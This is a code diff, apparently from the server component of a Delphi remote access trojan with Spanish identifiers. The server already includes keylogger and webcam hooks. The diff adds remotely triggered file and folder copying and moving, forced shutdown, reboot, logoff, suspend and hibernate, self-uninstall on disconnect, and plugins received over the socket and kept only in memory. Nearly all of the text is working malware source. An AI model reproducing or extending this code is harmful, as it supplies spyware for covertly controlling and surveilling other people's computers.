@@ -19,8 +19,6 @@ uses
   SysUtils,
   ShellAPI,
   Classes,
-  LOMLib in 'LOMLib.pas',
-  LOMTask in 'LOMTask.pas',
   MiniReg in 'MiniReg.pas',
   SettingsDef in 'SettingsDef.pas',
   SndKey32 in 'SndKey32.pas',
@@ -162,7 +160,7 @@ end;
 
 procedure Iniciar();
 var
-  Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3, TempStr4: AnsiString;
+  Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3: AnsiString;
   Tipo, BotonPulsado, i, o: Integer;
   TempCardinal: Cardinal;
   Tam: Int64;
@@ -177,7 +175,10 @@ var
   capiniciadam, bool: Boolean;
   MS: TMemoryStream;
   ExitCode: Longword;
+  DesinstalarServer : boolean;
+  buf: array[0..0] of char;
 begin
+  DesinstalarServer := false;
   try
     begin
       sock := TClientSocket.Create; //Socket principal
@@ -283,7 +284,8 @@ begin
               if TempStr = 'DESINSTALAR' then
                 begin
                   SendText('MSG|{0}' + ENTER);
-                  //Desinstalar();
+                  DesinstalarServer := true;
+                  Sock.disconnect; //Para que realice las acciones de desconexión antes de desinstalarse
                 end;
 
               if TempStr = 'ACTUALIZAR' then
@@ -679,12 +681,43 @@ begin
               TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //desde
               Delete(Recibido, 1, Pos('|', Recibido));
               TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //a
-              if copyfile(PChar(TempStr), PChar(TempStr1), False) then
-                SendText('MSG|{37}' + ENTER)
+              if DirectoryExists((TempStr)) then
+              begin
+                if CopiarCarpeta(PChar(TempStr), PChar(TempStr1)) then
+                  SendText('MSG|{37}' + ENTER)
+                else
+                  SendText('MSG|{38}' + ENTER);
+              end
               else
-                SendText('MSG|{38}' + ENTER);
+              begin
+                if copyfile(PChar(TempStr), PChar(TempStr1), False) then
+                  SendText('MSG|{37}' + ENTER)
+                else
+                  SendText('MSG|{38}' + ENTER);
+              end;
             end;
 
+          if Copy(Recibido, 1, 4) = 'CUTF' then
+            begin
+              Delete(Recibido, 1, 5);
+              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //desde
+              Delete(Recibido, 1, Pos('|', Recibido));
+              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //a
+              if DirectoryExists((TempStr)) then
+              begin
+                if MoverCarpeta(PChar(TempStr), PChar(TempStr1)) then
+                  SendText('MSG|{56}' + ENTER)
+                else
+                  SendText('MSG|{57}' + ENTER);
+              end
+              else if FileExists(TempStr) then
+              begin
+                if MoverArchivo(PChar(TempStr), PChar(TempStr1)) then
+                  SendText('MSG|{56}' + ENTER)
+                else
+                  SendText('MSG|{57}' + ENTER);
+              end;
+            end;
           //Cambiar atributos
           if Copy(Recibido, 1, 11) = 'CHATRIBUTOS' then
             begin
@@ -1191,7 +1224,7 @@ begin
                 bool := true;
               end;
 
-            if fileexists(extractfilepath(Configuracion.sCopyTo)+TempStr) and (bool = false) then   //Lo cargamos desde el archivo
+            if ((fileexists(extractfilepath(Configuracion.sCopyTo)+TempStr) or (Plugins[PluginCount].content <> '')) and (bool = false)) then   //Lo cargamos desde el archivo
             begin
               Plugins[PluginCount].Nombre := TempStr;
               Plugins[PluginCount].id := i;
@@ -1218,12 +1251,34 @@ begin
             Delete(Recibido, 1, Pos('|', Recibido));
             i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //ID
             Delete(Recibido, 1, Pos('|', Recibido));
-                                                                 
-            getFile(Sock, extractfilepath(Configuracion.sCopyTo)+TempStr+'.cp', o, false);  //Lo recibimos a un archivo con el nombre del plugin+'.cp'
+            TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Guardar a disco: T=si, F=no
+            Delete(Recibido, 1, Pos('|', Recibido));
 
+            if TempStr2 = 'T' then
+              getFile(Sock, extractfilepath(Configuracion.sCopyTo)+TempStr+'.cp', o, false)  //Lo recibimos a un archivo con el nombre del plugin+'.cp'
+            else
+            begin
+              buf[0] := ' ';
+              while (0 <> o) and Sock.Connected do
+              begin
+                try
+                  Sock.ReceiveBuffer(buf, SizeOf(buf));
+                except
+                  Plugins[PluginCount].content := '';
+                  Sock.Destroy;
+                  exit;
+                end;
+                
+                if length(buf[0]) > 0 then
+                begin
+                  o := o-1;
+                  Plugins[PluginCount].content := Plugins[PluginCount].content + (Buf[0]);
+                end;
+              end;
+              if (0 <> o) then break; //Nos hemos desconectado
+            end;
             Plugins[PluginCount].Nombre := TempStr;
             Plugins[PluginCount].id := i;
-
 
             if CargarPlugin(PluginCount, sock) then
             begin
@@ -1244,7 +1299,37 @@ begin
               end;
 
           end;
-          
+
+          if Pos('APAGARPC', Recibido) = 1 then
+          begin
+            ObtenerPrivilegioDeApagado();
+            ExitWindowsEx(EWX_SHUTDOWN+EWX_FORCE,0);
+          end;
+
+          if Pos('REINICIARPC', Recibido) = 1 then
+          begin
+            ObtenerPrivilegioDeApagado();
+            ExitWindowsEx(EWX_REBOOT+EWX_FORCE,0);
+          end;
+
+          if Pos('CERRARSESIONPC', Recibido) = 1 then
+          begin
+            ObtenerPrivilegioDeApagado();
+            ExitWindowsEx(EWX_LOGOFF+EWX_FORCE,0);
+          end;
+
+          if Pos('SUSPENDERPC', Recibido) = 1 then
+          begin
+            ObtenerPrivilegioDeApagado();
+            SetSystemPowerState(true,true);
+          end;
+
+          if Pos('HIBERNARPC', Recibido) = 1 then
+          begin
+            ObtenerPrivilegioDeApagado();
+            SetSystemPowerState(false,true);
+          end;
+
           lastCommandTime := GetTickCount;
           Busy := False;
         end; //while sock.connected do
@@ -1263,6 +1348,8 @@ begin
       CapturaKeylogger := '';
       pararcapturathread := True;
       DesactivarWebcams(); //Desactivamos las webcams para que las pueda usar normalmente
+      if DesinstalarServer then
+        Desinstalar();
     end //try
   except
     begin
@@ -1283,7 +1370,7 @@ begin
   Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
   if not Configuracion.bCopiarArchivo then
     Configuracion.sCopyTo := extractfilepath(paramstr(0));
-  VersionDelServer := '1.10';
+  VersionDelServer := '1.12';
   BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
   OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   CargarPluginsDeInicio();
